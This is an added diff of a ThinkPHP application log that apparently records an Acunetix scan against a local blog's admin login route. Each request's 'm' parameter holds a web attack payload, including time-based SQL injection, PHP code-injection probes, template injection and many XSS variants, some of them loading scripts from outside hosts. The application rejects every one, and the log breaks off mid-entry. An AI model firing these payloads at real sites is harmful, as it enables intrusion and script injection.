+[ 2017-11-18T19:59:40+08:00 ] 127.0.0.1 /admin.php?c=login&m=-1%20OR%203*2>(0%2b5%2b360-360)
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000932s ]
+ERR: 无法加载模块:-1 OR 3*2>(0+5+360-360)
+
+[ 2017-11-18T19:59:40+08:00 ] 127.0.0.1 /admin.php?c=login&m=!(()%26%26!%7c*%7c*%7c
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000930s ]
+ERR: 无法加载模块:!(()&&!|*|*|
+
+[ 2017-11-18T19:59:40+08:00 ] 127.0.0.1 /admin.php?c=login&m=if(now()=sysdate()%2csleep(6)%2c0)
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.003851s ]
+ERR: 无法加载模块:If(now()=sysdate(),sleep(6),0)
+
+[ 2017-11-18T19:59:40+08:00 ] 127.0.0.1 /admin.php?c=login&m=0'XOR(if(now()=sysdate()%2csleep(6)%2c0))XOR'Z
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000680s ]
+ERR: 无法加载模块:0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z
+
+[ 2017-11-18T19:59:40+08:00 ] 127.0.0.1 /admin.php?c=login&m=%5e(%23%24!%40%23%24)(()))******
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000831s ]
+ERR: 无法加载模块:^(#$!@#$)(()))******
+
+[ 2017-11-18T19:59:40+08:00 ] 127.0.0.1 /admin.php?c=login&m[$acunetix]=1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000634s ]
+NOTIC: [2] ucfirst() expects parameter 1 to be string, array given D:\phpStudy\WWW\TPblog\ThinkPHP\Library\Think\Dispatcher.class.php 第 336 行.
+ERR: 无法加载模块:
+
+[ 2017-11-18T19:59:40+08:00 ] 127.0.0.1 /admin.php?c=login&m=0"XOR(if(now()=sysdate()%2csleep(2)%2c0))XOR"Z
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000093s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001647s ]
+ERR: 无法加载模块:0"XOR(if(now()=sysdate(),sleep(2),0))XOR"Z
+
+[ 2017-11-18T19:59:40+08:00 ] 127.0.0.1 /admin.php?c=login&m='"()
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000836s ]
+ERR: 无法加载模块:'"()
+
+[ 2017-11-18T19:59:40+08:00 ] 127.0.0.1 /admin.php?c=login&m=(select(0)from(select(sleep(2)))v)/*'%2b(select(0)from(select(sleep(2)))v)%2b'"%2b(select(0)from(select(sleep(2)))v)%2b"*/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000614s ]
+ERR: 无法加载模块:(select(0)from(select(sleep(2)))v)/*'+(select(0)from(select(sleep(2)))v)+'"+(select(0)from(select(sleep(2)))v)+"*/
+
+[ 2017-11-18T19:59:40+08:00 ] 127.0.0.1 /admin.php?c=login&m=-1;%20waitfor%20delay%20'0:0:2'%20--%20
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000732s ]
+ERR: 无法加载模块:-1; waitfor delay '0:0:2' -- 
+
+[ 2017-11-18T19:59:40+08:00 ] 127.0.0.1 /admin.php?c=login&m=-1);%20waitfor%20delay%20'0:0:2'%20--%20
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000621s ]
+ERR: 无法加载模块:-1); waitfor delay '0:0:2' -- 
+
+[ 2017-11-18T19:59:40+08:00 ] 127.0.0.1 /admin.php?c=login&m=-1));%20waitfor%20delay%20'0:0:2'%20--%20
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000734s ]
+ERR: 无法加载模块:-1)); waitfor delay '0:0:2' -- 
+
+[ 2017-11-18T19:59:40+08:00 ] 127.0.0.1 /admin.php?c=login&m=12345'"\'\");|]*%00{%0d%0a<%00>%bf%27'💩
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000619s ]
+ERR: 无法加载模块:12345'"\'\");|]*{
+�''💩
+
+[ 2017-11-18T19:59:40+08:00 ] 127.0.0.1 /admin.php?c=login&m=1%20waitfor%20delay%20'0:0:2'%20--%20
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000031s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000758s ]
+ERR: 无法加载模块:1 waitfor delay '0:0:2' -- 
+
+[ 2017-11-18T19:59:40+08:00 ] 127.0.0.1 /admin.php?c=login&m[]=
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000651s ]
+NOTIC: [2] ucfirst() expects parameter 1 to be string, array given D:\phpStudy\WWW\TPblog\ThinkPHP\Library\Think\Dispatcher.class.php 第 336 行.
+ERR: 无法加载模块:
+
+[ 2017-11-18T19:59:40+08:00 ] 127.0.0.1 /admin.php?c=login&m=QC5FiCHz';%20waitfor%20delay%20'0:0:4'%20--%20
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000646s ]
+ERR: 无法加载模块:QC5FiCHz'; waitfor delay '0:0:4' -- 
+
+[ 2017-11-18T19:59:40+08:00 ] 127.0.0.1 /admin.php?c=login&m=nVaLomO0');%20waitfor%20delay%20'0:0:4'%20--%20
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000700s ]
+ERR: 无法加载模块:NVaLomO0'); waitfor delay '0:0:4' -- 
+
+[ 2017-11-18T19:59:40+08:00 ] 127.0.0.1 /admin.php?c=login&m=;print(md5(acunetix_wvs_security_test));
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000677s ]
+ERR: 无法加载模块:;print(md5(acunetix_wvs_security_test));
+
+[ 2017-11-18T19:59:40+08:00 ] 127.0.0.1 /admin.php?c=login&m=wx14OZBZ'));%20waitfor%20delay%20'0:0:4'%20--%20
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000791s ]
+ERR: 无法加载模块:Wx14OZBZ')); waitfor delay '0:0:4' -- 
+
+[ 2017-11-18T19:59:40+08:00 ] 127.0.0.1 /admin.php?c=login&m=-1;select%20pg_sleep(4);%20--%20
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000666s ]
+ERR: 无法加载模块:-1;select pg_sleep(4); -- 
+
+[ 2017-11-18T19:59:40+08:00 ] 127.0.0.1 /admin.php?c=login&m=';print(md5(acunetix_wvs_security_test));%24a='
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000839s ]
+ERR: 无法加载模块:';print(md5(acunetix_wvs_security_test));$a='
+
+[ 2017-11-18T19:59:40+08:00 ] 127.0.0.1 /admin.php?c=login&m=-1);select%20pg_sleep(4);%20--%20
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001379s ]
+ERR: 无法加载模块:-1);select pg_sleep(4); -- 
+
+[ 2017-11-18T19:59:41+08:00 ] 127.0.0.1 /admin.php?c=login&m=";print(md5(acunetix_wvs_security_test));%24a="
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000039s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000726s ]
+ERR: 无法加载模块:";print(md5(acunetix_wvs_security_test));$a="
+
+[ 2017-11-18T19:59:41+08:00 ] 127.0.0.1 /admin.php?c=login&m=-1));select%20pg_sleep(4);%20--%20
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000917s ]
+ERR: 无法加载模块:-1));select pg_sleep(4); -- 
+
+[ 2017-11-18T19:59:41+08:00 ] 127.0.0.1 /admin.php?c=login&m=%24{%40print(md5(acunetix_wvs_security_test))}
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000626s ]
+ERR: 无法加载模块:${@print(md5(acunetix_wvs_security_test))}
+
+[ 2017-11-18T19:59:41+08:00 ] 127.0.0.1 /admin.php?c=login&m=VFv8fYcF';select%20pg_sleep(6);%20--%20
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000570s ]
+ERR: 无法加载模块:VFv8fYcF';select pg_sleep(6); -- 
+
+[ 2017-11-18T19:59:41+08:00 ] 127.0.0.1 /admin.php?c=login&m=lyH7MSAd');select%20pg_sleep(6);%20--%20
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000648s ]
+ERR: 无法加载模块:LyH7MSAd');select pg_sleep(6); -- 
+
+[ 2017-11-18T19:59:41+08:00 ] 127.0.0.1 /admin.php?c=login&m=HttP://testasp.vulnweb.com/t/xss.html%3f%2500
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001056s ]
+ERR: 无法加载模块:HttP://testasp.vulnweb.com/t/xss.html?%00
+
+[ 2017-11-18T19:59:41+08:00 ] 127.0.0.1 /admin.php?c=login&m=%24{%40print(md5(acunetix_wvs_security_test))}%5c
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000569s ]
+ERR: 无法加载模块:${@print(md5(acunetix_wvs_security_test))}\
+
+[ 2017-11-18T19:59:41+08:00 ] 127.0.0.1 /admin.php?c=login&m=testasp.vulnweb.com/t/xss.html%3f%2500
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000632s ]
+ERR: 无法加载模块:Testasp.vulnweb.com/t/xss.html?%00
+
+[ 2017-11-18T19:59:41+08:00 ] 127.0.0.1 /admin.php?c=login&m=0WVYLAYW'));select%20pg_sleep(6);%20--%20
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000629s ]
+ERR: 无法加载模块:0WVYLAYW'));select pg_sleep(6); -- 
+
+[ 2017-11-18T19:59:41+08:00 ] 127.0.0.1 /admin.php?c=login&m=http://hitxbQ3TgZAYf.bxss.me/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000775s ]
+ERR: 无法加载模块:Http://hitxbQ3TgZAYf.bxss.me/
+
+[ 2017-11-18T19:59:41+08:00 ] 127.0.0.1 /admin.php?c=login&m=admin.php
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000922s ]
+ERR: 无法加载模块:Admin.php
+
+[ 2017-11-18T19:59:41+08:00 ] 127.0.0.1 /admin.php?c=login&m=admin.php%00
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000631s ]
+ERR: 无法加载模块:Admin.php
+
+[ 2017-11-18T19:59:41+08:00 ] 127.0.0.1 /admin.php?c=login&m=admin.php/.
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000553s ]
+ERR: 无法加载模块:Admin.php/.
+
+[ 2017-11-18T19:59:41+08:00 ] 127.0.0.1 /admin.php?c=login&m=)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000668s ]
+ERR: 无法加载模块:)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))
+
+[ 2017-11-18T19:59:42+08:00 ] 127.0.0.1 /admin.php?c=login&m=1'"
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000558s ]
+ERR: 无法加载模块:1'"
+
+[ 2017-11-18T19:59:42+08:00 ] 127.0.0.1 /admin.php?c=login&m='"
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000089s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000923s ]
+ERR: 无法加载模块:'"
+
+[ 2017-11-18T19:59:42+08:00 ] 127.0.0.1 /admin.php?c=login&m=/www.vulnweb.com
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000831s ]
+ERR: 无法加载模块:/www.vulnweb.com
+
+[ 2017-11-18T19:59:42+08:00 ] 127.0.0.1 /admin.php?c=login&m=<!--
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000647s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T19:59:42+08:00 ] 127.0.0.1 /admin.php?c=login&m=1%00%c0%a7%c0%a2%252527%252522
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000565s ]
+ERR: 无法加载模块:1����%2527%2522
+
+[ 2017-11-18T19:59:42+08:00 ] 127.0.0.1 /admin.php?c=login&m=965267
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000729s ]
+ERR: 无法加载模块:965267
+
+[ 2017-11-18T19:59:42+08:00 ] 127.0.0.1 /admin.php?c=login&m=%40%40xmDdt
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000586s ]
+ERR: 无法加载模块:@@xmDdt
+
+[ 2017-11-18T19:59:42+08:00 ] 127.0.0.1 /admin.php?c=login&m=http://www.vulnweb.com
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000635s ]
+ERR: 无法加载模块:Http://www.vulnweb.com
+
+[ 2017-11-18T19:59:42+08:00 ] 127.0.0.1 /admin.php?c=login&m=JyI=
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001069s ]
+ERR: 无法加载模块:JyI=
+
+[ 2017-11-18T19:59:42+08:00 ] 127.0.0.1 /admin.php?c=login&m=//www.vulnweb.com
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000082s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001177s ]
+ERR: 无法加载模块://www.vulnweb.com
+
+[ 2017-11-18T19:59:42+08:00 ] 127.0.0.1 /admin.php?c=login&m=%bf'%bf"
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000567s ]
+ERR: 无法加载模块:�'�"
+
+[ 2017-11-18T19:59:42+08:00 ] 127.0.0.1 /admin.php?c=login&m=/%5cwww.vulnweb.com
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000568s ]
+ERR: 无法加载模块:/\www.vulnweb.com
+
+[ 2017-11-18T19:59:42+08:00 ] 127.0.0.1 /admin.php?c=login&m=%f0''%f0""
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000871s ]
+ERR: 无法加载模块:�''�""
+
+[ 2017-11-18T19:59:44+08:00 ] 127.0.0.1 /admin.php?c=login&m=1'"()%26%25<acx><ScRiPt%20>MtS8(9088)</ScRiPt>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000625s ]
+ERR: 无法加载模块:1'"()&%MtS8(9088)
+
+[ 2017-11-18T19:59:44+08:00 ] 127.0.0.1 /admin.php?c=login&m='"()%26%25<acx><ScRiPt%20>MtS8(9046)</ScRiPt>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000645s ]
+ERR: 无法加载模块:'"()&%MtS8(9046)
+
+[ 2017-11-18T19:59:44+08:00 ] 127.0.0.1 /admin.php?c=login&m=19104164
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000724s ]
+ERR: 无法加载模块:19104164
+
+[ 2017-11-18T19:59:44+08:00 ] 127.0.0.1 /admin.php?c=login&m=acu5608%EF%BC%9Cs1%EF%B9%A5s2%CA%BAs3%CA%B9uca5608
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000616s ]
+ERR: 无法加载模块:Acu5608＜s1﹥s2ʺs3ʹuca5608
+
+[ 2017-11-18T19:59:45+08:00 ] 127.0.0.1 /admin.php?c=login&m=acux9308%C0%BEz1%C0%BCz2a%90bcxuca9308
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000738s ]
+ERR: 无法加载模块:Acux9308��z1��z2a�bcxuca9308
+
+[ 2017-11-18T19:59:45+08:00 ] 127.0.0.1 /admin.php?c=login&m={{9999958*9999269}}
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000658s ]
+ERR: 无法加载模块:{{9999958*9999269}}
+
+[ 2017-11-18T19:59:45+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<ScRiPt%20>MtS8(9886)</ScRiPt>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000633s ]
+ERR: 无法加载模块:1MtS8(9886)
+
+[ 2017-11-18T19:59:45+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<W0Q12F>VKAPS[!%2b!]</W0Q12F>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000657s ]
+ERR: 无法加载模块:1VKAPS[!+!]
+
+[ 2017-11-18T19:59:45+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<script>MtS8(9913)</script>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000063s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000855s ]
+ERR: 无法加载模块:1MtS8(9913)
+
+[ 2017-11-18T19:59:45+08:00 ] 127.0.0.1 /admin.php?c=login&m=1%3C%53%63%52%3C%53%63%52%69%50%74%3E%49%70%54%3E%4D%74%53%38%28%39%36%37%36%29%3C%2F%73%43%72%3C%53%63%52%69%50%74%3E%49%70%54%3E
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000718s ]
+ERR: 无法加载模块:1MtS8(9676)
+
+[ 2017-11-18T19:59:45+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<ScRiPt%20%0d%0a>MtS8(9199)</ScRiPt>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000688s ]
+ERR: 无法加载模块:1MtS8(9199)
+
+[ 2017-11-18T19:59:45+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<ScRiPt/acu%20src=//testasp.vulnweb.com/t/xss.js%3f9405></ScRiPt>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000714s ]
+ERR: 无法加载模块:1
+
+[ 2017-11-18T19:59:45+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<%00ScRiPt%20%0d%0a>MtS8(9907)</ScRiPt>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000746s ]
+ERR: 无法加载模块:1MtS8(9907)
+
+[ 2017-11-18T19:59:45+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<video><source%20onerror="javascript:MtS8(9865)">
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000671s ]
+ERR: 无法加载模块:1
+
+[ 2017-11-18T19:59:45+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<svg%09%0a%0b%0c%0d%a0%00onload=MtS8(9910);>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000678s ]
+ERR: 无法加载模块:1
+
+[ 2017-11-18T19:59:45+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<isindex%20type=image%20src=1%20onerror=MtS8(9520)>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000670s ]
+ERR: 无法加载模块:1
+
+[ 2017-11-18T19:59:45+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<iframe%20src='data:text/html;base64%2cPHNjcmlwdD5hbGVydCgnYWN1bmV0aXgteHNzLXRlc3QnKTwvc2NyaXB0Pgo='%20invalid='9860'>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000648s ]
+ERR: 无法加载模块:1
+
+[ 2017-11-18T19:59:45+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<body%20onload=MtS8(9775)>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000775s ]
+ERR: 无法加载模块:1
+
+[ 2017-11-18T19:59:45+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<img%20src=//testasp.vulnweb.com/t/dot.gif%20onload=MtS8(9563)>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000623s ]
+ERR: 无法加载模块:1
+
+[ 2017-11-18T19:59:45+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<img%20src=xyz%20OnErRor=MtS8(9949)>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000690s ]
+ERR: 无法加载模块:1
+
+[ 2017-11-18T19:59:45+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<img/src=">"%20onerror=alert(9742)>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000669s ]
+ERR: 无法加载模块:1
+
+[ 2017-11-18T19:59:45+08:00 ] 127.0.0.1 /admin.php?c=login&m=%2531%253C%2553%2563%2552%2569%2550%2574%2520%253E%254D%2574%2553%2538%25289591%2529%253C%252F%2573%2543%2572%2569%2570%2554%253E
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000638s ]
+ERR: 无法加载模块:%31%3C%53%63%52%69%50%74%20%3E%4D%74%53%38%289591%29%3C%2F%73%43%72%69%70%54%3E
+
+[ 2017-11-18T19:59:46+08:00 ] 127.0.0.1 /admin.php?c=login&m=1\u003CScRiPt\MtS8(9864)\u003C/sCripT\u003E
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000686s ]
+ERR: 无法加载模块:1\u003CScRiPt\MtS8(9864)\u003C/sCripT\u003E
+
+[ 2017-11-18T19:59:46+08:00 ] 127.0.0.1 /admin.php?c=login&m=1%26lt;ScRiPt%26gt;MtS8(9641)%26lt;/sCripT%26gt;
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000830s ]
+ERR: 无法加载模块:1&lt;ScRiPt&gt;MtS8(9641)&lt;/sCripT&gt;
+
+[ 2017-11-18T19:59:46+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<input%20autofocus%20onfocus=MtS8(9806)>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001035s ]
+ERR: 无法加载模块:1
+
+[ 2017-11-18T19:59:46+08:00 ] 127.0.0.1 /admin.php?c=login&m=<a%20HrEF=http://www.vulnweb.com></a>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000650s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T19:59:46+08:00 ] 127.0.0.1 /admin.php?c=login&m=<a%20HrEF=jaVaScRiPT:>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001082s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T19:59:46+08:00 ] 127.0.0.1 /admin.php?c=login&m=[url=http://www.vulnweb.com][/url]
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000963s ]
+ERR: 无法加载模块:[url=http://www.vulnweb.com][/url]
+
+[ 2017-11-18T19:59:46+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<img<!--%20-->%20src=x%20onerror=alert(9596);//><!--%20-->
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000768s ]
+ERR: 无法加载模块:1
+
+[ 2017-11-18T19:59:46+08:00 ] 127.0.0.1 /admin.php?c=login&m=1}body{acu:Expre/**/SSion(MtS8(9308))}
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001824s ]
+ERR: 无法加载模块:1}body{acu:Expre/**/SSion(MtS8(9308))}
+
+[ 2017-11-18T19:59:46+08:00 ] 127.0.0.1 /admin.php?c=login&m=1<%25%20contenteditable%20onresize=MtS8(9427)>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000624s ]
+ERR: 无法加载模块:1
+
+[ 2017-11-18T19:59:46+08:00 ] 127.0.0.1 /admin.php?c=login&m=1TqPKy%0a<ScRiPt%20>MtS8(9371)</ScRiPt>
+INFO: [ app_init ] --START--
